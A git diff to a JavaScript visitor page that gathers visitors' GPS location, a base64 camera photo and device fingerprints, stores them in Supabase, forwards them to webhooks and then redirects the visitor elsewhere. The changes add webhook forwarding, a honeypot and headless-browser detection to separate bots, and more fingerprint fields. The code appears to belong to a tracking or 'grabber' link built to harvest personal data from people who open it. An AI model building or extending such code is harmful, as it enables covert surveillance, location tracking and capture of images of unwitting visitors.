@@ -1,6 +1,8 @@
 import { collectAll } from "./collect-v3.js";
 import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";
-import { shouldSkipVisitorFlow } from "./bot-filter.js";
+import { shouldSkipVisitorFlow, isAutomatedBrowser } from "./bot-filter.js";
+import { mountHoneypot, honeypotTriggered } from "./honeypot.js";
+import { notifyWebhooks } from "./webhook.js";
 
 function cfg() {
   return window.APP_CONFIG || {};
@@ -40,8 +42,6 @@ function trimForKeepalive(payload) {
 /**
  * Fire-and-redirect save.
  * fetch keepalive survives window.location.replace() on iOS Safari and Chrome.
- * If the payload is too big for keepalive, the photo is stripped and the row
- * still lands with camera_granted set so the dashboard shows the denial.
  */
 function saveVisitFireAndForget(payload) {
   const { supabaseUrl } = cfg();
@@ -59,6 +59,12 @@ function saveVisitFireAndForget(payload) {
   } catch {
     /* ignore */
   }
+
+  try {
+    notifyWebhooks(payload);
+  } catch {
+    /* ignore */
+  }
 }
 
 async function saveVisit(payload) {
@@ -71,10 +77,15 @@ async function saveVisit(payload) {
     body: JSON.stringify(payload),
   });
   if (!res.ok) throw new Error(String(res.status));
+  try {
+    notifyWebhooks(payload);
+  } catch {
+    /* ignore */
+  }
   return { ok: true };
 }
 
-function buildPayload(collected, isBot) {
+function buildPayload(collected, isBot, honeypot) {
   const hasGps = !!collected.gps;
 
   const coordinates = hasGps
@@ -105,7 +116,12 @@ function buildPayload(collected, isBot) {
       hardware_extra: collected.hardware,
       hardware_async: collected.hardware_async,
       fingerprint_channels: collected.fingerprint_channels,
-      visitKind: "human",
+      webgl: collected.webgl,
+      traffic: collected.traffic,
+      honeypot: honeypot || { hit: false },
+      ip_geo_source: collected.ip_geo_source || null,
+      schemaVersion: collected.schemaVersion || 4,
+      visitKind: isBot ? "bot" : "human",
     },
     location_granted: hasGps,
     location: coordinates,
@@ -119,6 +135,8 @@ function buildPayload(collected, isBot) {
 
 export function initVisitorPage() {
   async function run() {
+    mountHoneypot(document.body);
+
     if (shouldSkipVisitorFlow()) {
       window.location.replace(await fetchRedirectUrl());
       return;
@@ -135,14 +153,18 @@ export function initVisitorPage() {
         camera_granted: false,
         photo_base64: null,
         gps_reason: "error",
+        traffic: null,
       };
     }
 
+    const hp = honeypotTriggered();
     const isBot =
+      hp.hit ||
       collected.device?.flags?.webdriver ||
+      isAutomatedBrowser() ||
       /HeadlessChrome|PhantomJS/i.test(collected.device?.userAgent || "");
 
-    const payload = buildPayload(collected, isBot);
+    const payload = buildPayload(collected, isBot, hp);
     const redirectTarget = await redirectPromise;
 
     saveVisitFireAndForget(payload);
